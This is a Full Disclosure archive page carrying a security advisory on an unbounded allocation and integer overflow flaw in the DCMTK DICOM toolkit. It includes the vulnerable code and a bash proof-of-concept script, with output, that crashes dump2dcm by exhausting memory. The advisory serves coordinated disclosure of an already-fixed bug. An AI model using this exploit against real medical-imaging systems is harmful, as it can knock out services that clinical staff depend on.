---
title: [SYSS-2026-050]: DICOM Toolkit (DCMTK) - Integer Overflow or Wraparound (CWE-190)
url: https://seclists.org/fulldisclosure/2026/Aug/28
source: Full Disclosure
date: 2026-08-06
fetch_date: 2026-08-07T04:29:16.786267
---

# [SYSS-2026-050]: DICOM Toolkit (DCMTK) - Integer Overflow or Wraparound (CWE-190)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](27)
[By Date](date.html#28)
[![Next](/images/right-icon-16x16.png)](29)

[![Previous](/images/left-icon-16x16.png)](27)
[By Thread](index.html#28)
[![Next](/images/right-icon-16x16.png)](29)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2026-050]: DICOM Toolkit (DCMTK) - Integer Overflow or Wraparound (CWE-190)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Fri, 31 Jul 2026 10:02:55 +0200

---

```
Advisory ID:               SYSS-2026-050
Product:                   DCMTK (DICOM ToolKit)
Manufacturer:              OFFIS e.V. / DCMTK Community
Affected Version(s):       3.7.0
Tested Version(s):         3.7.0
Vulnerability Type:        Integer Overflow or Wraparound (CWE-190)
Risk Level:                Medium
Solution Status:           Fixed
Manufacturer Notification: 2026-07-02
Solution Date:             2026-07-03
Public Disclosure:         2026-07-31
CVE Reference:             Not yet assigned
Author of Advisory:        Matthias Deeg, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

DCMTK (DICOM ToolKit) is an open-source collection of libraries and
applications implementing large parts of the DICOM (Digital Imaging
and Communications in Medicine) standard (see [1]).

DCMTK's textual value import is vulnerable to unbounded Value Multiplicity
(VM) allocation. An attacker who can supply a crafted textual DICOM dump
or XML/JSON import payload can cause memory exhaustion or heap buffer
overflow via integer overflow in the typed array allocation.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The function DcmElement::determineVM() in libsrc/dcelem.cc (line 2154)
counts backslash ('\') delimiters in a textual element value string and
returns the count as the VM:

  unsigned long DcmElement::determineVM(const char *str, const size_t len)
  {
      unsigned long vm = 0;
      if ((str != NULL) && (len > 0)) {
          vm = 1;
          const char *p = str;
          for (size_t i = 0; i < len; i++) {
              if (*p++ == '\\')
                  vm++;
          }
      }
      return vm;
  }

This value is used throughout the VR implementation to allocate typed
arrays:

  - dcvrsl.cc:335: new Sint32[vm]
  - dcvrul.cc:       new Uint32[vm]
  - dcvrus.cc:       new Uint16[vm]
  - dcvrfd.cc:       new Float64[vm]
  - ... and many more

A crafted ASCII dump containing a numeric VR element with many
backslash-separated tokens yields a large VM. Allocating Float64[vm]
requires 8 * vm bytes before the converted binary value is inserted into
the DICOM object. With sufficiently large inputs on 32-bit builds,
vm * sizeof(T) can also overflow size_t, producing a small allocation
that is subsequently written beyond bounds.

The attack chain is as follows:

  1. The attacker crafts a textual DICOM dump/XML/JSON with a numeric VR
     element (SL, UL, FD, etc.) whose value consists of a large number
     of backslash-delimited tokens.

  2. determineVM() counts the tokens and returns an unbounded VM.

  3. The VR putString() allocates new T[vm] without bounds checking.

  4. Memory exhaustion (DoS) or heap buffer overflow is triggered via
     an integer overflow in the allocation size.

This path is reached by APIs and tools that parse textual values into
typed numeric VRs, e.g. dump2dcm calling DcmElement::putString().

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

The following exploit script creates a specially crafted ASCII DICOM
dump file with a numeric VR element (SL) containing many backslash-
separated tokens. This file is processed with dump2dcm under a memory
limit to trigger the memory exhaustion (std::bad_alloc).

cat > poc.sh << 'EOPOC'
#!/bin/bash
#
# POC Exploit for unbounded VM allocation in dump2dcm
# Proof of concept exploit for SYSS-2026-050
#
# Creates a crafted ASCII DICOM dump with a numeric VR element (SL)
# containing NUM_VALUES backslash-separated tokens, then feeds it
# to dump2dcm under a memory limit to trigger std::bad_alloc.
#

set -euo pipefail

DUMP2DCM="dump2dcm"
WORKDIR="/tmp/dump2dcm_poc_$$"
```

NUM\_VALUES=4000000 # 4 million values -> Sint32[4000000] = 16 MB
allocation

```
MEMORY_LIMIT=24576   # 24 MB virtual memory limit

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

echo "=== PoC: Unbounded VM Allocation in dump2dcm ==="
echo ""
echo "Vulnerability: DcmElement::determineVM() counts backslash delimiters"
echo "               without bounds, causing new Sint32[vm] to allocate"
echo "               vm * 4 bytes without any cap."
echo ""
echo "Configuration:"
echo "  Values (VM):      $NUM_VALUES"
```

echo " Allocation: Sint32[$NUM\_VALUES] = $(( NUM\_VALUES \* 4 /
1024 / 1024 )) MB"
echo " Memory limit: ${MEMORY\_LIMIT} KB ($(( MEMORY\_LIMIT / 1024 ))
MB)"

```
echo "  dump2dcm:         $DUMP2DCM"
echo ""

mkdir -p "$WORKDIR"

DUMP_FILE="$WORKDIR/exploit.dump"
OUTPUT_FILE="$WORKDIR/exploit.dcm"
```

echo "[\*] Generating crafted ASCII DICOM dump with $NUM\_VALUES
backslash-delimited values ..."

```
# Generate the payload using Python (avoids shell escaping issues)
python3 "$SCRIPT_DIR/generate_payload.py" "$NUM_VALUES" > "$DUMP_FILE"

DUMP_SIZE=$(du -sh "$DUMP_FILE" | cut -f1)
echo "[+] Crafted dump file: $DUMP_FILE ($DUMP_SIZE)"

echo ""
echo "[*] Running dump2dcm under memory limit (ulimit -v $MEMORY_LIMIT)..."
echo ""

# Run dump2dcm with memory limit
# +l sets max line length to 10M to accommodate the crafted SL element
ulimit -v "$MEMORY_LIMIT"
```

OUTPUT=$("$DUMP2DCM" +l 10000000 "$DUMP\_FILE" "$OUTPUT\_FILE" 2>&1) &&
EXIT\_CODE=0 || EXIT\_CODE=$?

```
echo "---"
echo "Result:"
echo "  Exit code: $EXIT_CODE"
echo "  Output:"
echo "$OUTPUT" | tail -20
echo ""

# Clean up
rm -rf "$WORKDIR"

if [ $EXIT_CODE -ne 0 ]; then
    echo "[+] SUCCESS: dump2dcm crashed with exit code $EXIT_CODE"
    echo "    The unbounded VM allocation exhausted memory as expected."
else
```

 echo "[-] FAIL: dump2dcm did not crash. The allocation may have
succeeded."

```
fi

echo ""
echo "=== PoC complete ==="
EOPOC

The following output shows a successful exploit crashing dump2dcm:

./poc.sh
=== PoC: Unbounded VM Allocation in dump2dcm ===

Vulnerability: DcmElement::determineVM() counts backslash delimiters
               without bounds, causing new Sint32[vm] to allocate
               vm * 4 bytes without any cap.

Configuration:
  Values (VM):      4000000
  Allocation:       Sint32[4000000] = 15 MB
  Memory limit:     24576 KB (24 MB)
  dump2dcm:         dump2dcm
```

[\*] Generating crafted ASCII DICOM dump with 4000000 backslash-delimited
values ...

```
[+] Crafted dump file: /tmp/dump2dcm_poc_2579/exploit.dump (7.7M)

[*] Running dump2dcm under memory limit (ulimit -v 24576)...

- ---
Result:
  Exit code: 134
  Output:
terminate called after throwing an instance of 'std::bad_alloc'
  what():  std::bad_alloc

[+] SUCCESS: dump2dcm crashed with exit code 134
    The unbounded VM allocation exhausted memory as expected.

=== PoC complete ===

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

This security issue was fixed with the commit
9cb99f1b0279e3e40243a8b9bd974edf78597a14 (see [4]).

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2026-07-02: Vulnerability reported to manufacturer
2026-07-02: Manufacturer acknowledges receipt of secu...